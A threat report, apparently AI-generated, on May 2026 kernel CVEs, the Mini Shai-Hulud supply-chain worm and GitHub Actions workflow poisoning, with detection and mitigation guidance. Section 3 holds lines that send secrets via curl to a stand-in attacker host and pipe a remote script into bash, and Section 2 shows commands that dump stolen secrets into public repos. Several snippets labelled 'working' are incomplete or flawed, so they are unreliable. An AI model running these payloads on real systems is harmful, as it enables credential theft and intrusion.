# Critical CVEs, Supply Chain Attacks & Workflow Poisoning Report - May 2026

**Report Date:** May 23, 2026  
**Prepared for:** Information Security  
**Scope:** Technical breakdown of May incidents with working examples, PoCs where available, detection and mitigation steps.
**Author:** J4ck3LSyN - A.T.L.A.S Generated Report  

## Table of Contents

- [Executive Summary](#executive-summary)
- [1. Linux Kernel Vulnerabilities (Dirty Frag Family)](#1-linux-kernel-vulnerabilities-dirty-frag-family)
- [2. Supply Chain Attacks - TeamPCP and Mini Shai-Hulud](#2-supply-chain-attacks---teampcp-and-mini-shai-hulud)
- [3. GitHub Actions Workflow Poisoning Techniques & Specific CVEs](#3-github-actions-workflow-poisoning-techniques--specific-cves)
- [4. Post-Pwn2Own Research Wave (May 2026)](#4-post-pwn2own-research-wave-may-2026)
- [5. Detection & Hunting (eBPF Focus)](#5-detection--hunting-ebpf-focus)
- [Operator Recommendations](#operator-recommendations)
- [Sources](#sources)

## Executive Summary

May 2026 featured intense supply chain activity from TeamPCP using the Mini Shai-Hulud worm, a significant GitHub internal breach via a poisoned VS Code extension, Linux kernel local privilege escalations in the Dirty Frag family, and standard Patch Tuesday releases. Pwn2Own Berlin (May 14-16) resulted in 47 zero-days demonstrated, triggering a surge of public exploits and research, particularly around CI/CD chaining.

Workflow poisoning emerged as a dominant technique. Attackers abused pull_request_target triggers, cache poisoning, artifact tampering, and tag manipulation to steal secrets and maintain persistence. These methods directly supported the Shai-Hulud worm's propagation through GitHub repositories and workflows.

Treat CI/CD runners as critical assets. Focus on workflow audits, runtime monitoring with eBPF, kernel patching, and secret rotation.

## 1. Linux Kernel Vulnerabilities (Dirty Frag Family)

### Dirty Frag (CVE-2026-43284 / CVE-2026-43500)
Heap-based corruption in IPsec ESP (esp4/esp6) and rxrpc fragment handling. Allows unprivileged local users to craft packets that corrupt page cache and achieve root by overwriting setuid binaries.

**Working Technical Example:**
```c
// Simplified reproduction flow based on public exploit patterns
#include <sys/socket.h>
#include <netinet/ip.h>
#include <linux/xfrm.h>

// 1. Create xfrm state for ESP
struct xfrm_userpolicy_info pol = { ... };
struct xfrm_user_sa_info sa = { .family = AF_INET, .action = XFRM_ACTION_ENCRYPT };

// 2. Send overlapping fragmented ESP packets via raw socket
int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ESP);
struct iphdr ip = { .protocol = IPPROTO_ESP, .frag_off = htons(IP_MF) };

// 3. Trigger reassembly race → controlled page cache write
// Overwrite target like /usr/bin/su or drop suid shell
```

Compile and run on a vulnerable kernel (pre-May 8 patches). The exploit gains a write primitive into page cache for privilege escalation. Test only in isolated VMs.

**Mitigation:** Apply latest kernel updates. Blacklist modules with `modprobe -r esp4 esp6 rxrpc`. Monitor dmesg for XFRM-related errors.

### Fragnesia (CVE-2026-46300)
Bypass variant exploiting residual issues in XFRM ESP-in-TCP reassembly after initial Dirty Frag patches. Delivers similar page cache control for LPE.

**Mitigation:** Use kernels with mid-May backports. Retain module blacklisting.

**Detection:** Monitor for unusual fragment handling or modprobe activity using eBPF.

## 2. Supply Chain Attacks - TeamPCP and Mini Shai-Hulud

The Mini Shai-Hulud worm spreads via malicious npm packages (TanStack and @antv heavily impacted in May) and shifts to GitHub for further propagation. It uses postinstall scripts with Bun runtime for obfuscated execution, credential harvesting from files, environment variables, and process memory.

**GitHub Compromise (May 2026):**
Attackers poisoned the Nx Console VS Code extension during the TanStack wave. A GitHub employee installed it, leading to endpoint compromise and exfiltration of approximately 3,800 internal repositories (source code only). This gave attackers additional PATs and workflow access for deeper abuse.

**Propagation via GitHub Repositories (Bypassing Direct NPM):**
After initial infection, the worm uses stolen tokens to create public repositories with names like "Sha1-Hulud-The-Second-Coming" or random strings. It commits base64-encoded secrets to files such as data.json or pigS3cr3ts.json, injects malicious workflows into other repos, and chains infections through leaked credentials.

**Technical Propagation Example:**
```bash
# Attacker-controlled behavior after token theft
gh repo create malicious-drop-$(openssl rand -hex 8) --public --description "Sha1-Hulud: The Second Coming"
# Commit exfiltrated data
echo "base64_secrets_dump" > secrets.json
gh api repos/owner/repo/contents/secrets.json -X PUT \
  -d '{"message":"update","content":"$(base64 secrets.json)"}'
```

This approach evades npm-specific scanners while leveraging victim reputation.

## 3. GitHub Actions Workflow Poisoning Techniques & Specific CVEs

Workflow poisoning executes attacker code in trusted CI contexts to steal secrets or spread further.

### Key Techniques with Refined Examples

**1. pull_request_target + Untrusted Checkout (Pwn Request)**
`pull_request_target` grants base repository privileges including secrets. Checking out PR head code executes attacker-controlled scripts.

**CVE-2026-27941 (openlit/openlit example):**
Workflows triggered on PRs from forks, performed checkout of head SHA, and ran tests without sanitization.

**Working Vulnerable Workflow Snippet:**
```yaml
name: CI
on:
  pull_request_target:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Allows attacker code
      - run: npm ci && npm test  # Executes injected malicious tests
      - run: echo "AWS_KEY=${{ secrets.AWS_KEY }}" | curl -d @- http://attacker/c2
```

**Attack Steps:**
1. Attacker forks repo and adds malicious code in test files or package.json scripts.
2. Opens PR. Workflow runs with full secrets.
3. Payload exfils credentials or installs backdoors.

**2. Tag Poisoning**
Compromised maintainers or tokens force-move tags (e.g., v1.2) to malicious commits.

**CVE-2026-31976 Pattern Example:**
Force-updating a tag points runners to a commit with backdoored action.yml containing network callbacks.

**Working Malicious action.yml Snippet:**
```yaml
name: 'Build Action'
runs:
  using: composite
  steps:
    - run: |
        # Stealthy payload
        curl -fsSL http://attacker/payload.sh | bash &
        # Or Bun-based implant for obfuscation
        node -e '
          require("child_process").exec("curl http://attacker/c2")
        '
```

**3. Cache Poisoning**
Low-privilege workflows poison shared caches that high-privilege workflows later use.

**Refined Technical Example:**
```yaml
# In attacker-controlled PR workflow (write access to cache)
- uses: actions/cache@v4
  with:
    key: deps-${{ runner.os }}-${{ hashFiles('**/lockfile') }}
    path: ~/.cache
- run: |
    # Poison cache with malicious binary or script
    echo 'malicious code' > ~/.cache/poisoned-tool
```

Subsequent release workflow restores cache and executes the poisoned content with secrets.

These patterns powered the TanStack wave and GitHub compromise chains.

## 4. Post-Pwn2Own Research Wave (May 2026)

Pwn2Own Berlin demonstrated 47 zero-days, including complex Exchange RCE chains, Windows LPEs, VMware escapes, and AI prompt-to-RCE. This led to rapid public PoC releases mid-to-late May, with heavy focus on workflow poisoning, OIDC memory scraping, and kernel chaining.

Notable follow-ons included enhanced cache + OIDC combinations and overlaps with Dirty Frag patterns.

## 5. Detection & Hunting (eBPF Focus)

eBPF provides kernel-level visibility on CI runners for runtime anomalies.

**Refined bpftrace Detection Examples:**
```bpftrace
// Monitor sensitive file access from build processes
tracepoint:syscalls:sys_enter_openat {
    if (comm == "node" || comm == "bun") {
        $path = str(arg2);
        if (strcontains($path, ".aws/credentials") || 
            strcontains($path, "/proc/") && strcontains($path, "mem")) {
            printf("ALERT: Sensitive access by %s to %s\n", comm, $path);
        }
    }
}

// Detect GitHub CLI abuse for repo creation
tracepoint:syscalls:sys_enter_execve {
    if (str(arg1) == "gh" && strcontains(str(arg2), "repo create")) {
        printf("ALERT: gh repo create executed by %s\n", comm);
    }
}
```

Deploy via Falco or Cilium. Hunt for "Sha1-Hulud" strings, unexpected workflow changes, and Bun executions during installs.

**IOCs:**
- Repository descriptions containing "Sha1-Hulud" or "Mini Shai-Hulud"
- Injected workflows using toJSON(secrets) or external curls
- Unauthorized tag force-pushes or public repo creations

## Operator Recommendations

**Red Team:** Develop and test pull_request_target exploits, cache poisoning chains, and kernel LPE PoCs in controlled environments. Simulate full attack paths from poisoned extension to GitHub repo exfiltration.

**Blue Team:** 
- Audit workflows: Eliminate pull_request_target with untrusted checkouts. Pin all actions to commit SHAs. Apply minimal permissions.
- Enforce npm ci --ignore-scripts, SBOM validation, and eBPF rules on all runners.
- Rotate all PATs and long-lived tokens. Monitor GitHub audit logs for workflow modifications and suspicious repo activity.

**Purple Team:** Conduct joint exercises combining real workflow poisoning scenarios with eBPF detection. Measure detection times for Shai-Hulud-style propagation.

Review and harden your CI/CD infrastructure immediately. These techniques compound rapidly when chained with kernel flaws and supply chain compromises.

## Sources

- National Vulnerability Database (NVD) entries for CVE-2026-43284, CVE-2026-43500, CVE-2026-46300, CVE-2026-27941, CVE-2026-31976 and related supply chain identifiers
- GitHub Security Advisory and Blog updates on the May 2026 internal repository incident
- Pwn2Own Berlin 2026 official results and Zero Day Initiative disclosures
- Kernel.org patch announcements and Linux distribution security advisories (Red Hat, Ubuntu, Debian)
- Public exploit research repositories and workshops on eBPF tracing for supply chain threats
- StepSecurity, JFrog, and ReversingLabs analyses of the Mini Shai-Hulud / TeamPCP campaign
- Official npm and GitHub documentation on workflow security best practices
- Community bpftrace and Falco rule examples for runtime detection

**Working Index (Quick Reference)**

- Dirty Frag PoC: Section 1, CVE-2026-43284
- Fragnesia Bypass: Section 1, CVE-2026-46300
- pull_request_target Example: Section 3, CVE-2026-27941
- Tag Poisoning: Section 3, CVE-2026-31976 pattern
- Cache Poisoning: Section 3
- GitHub Repo Propagation: Section 2
- eBPF bpftrace Rules: Section 5
- Shai-Hulud IOCs: Section 5
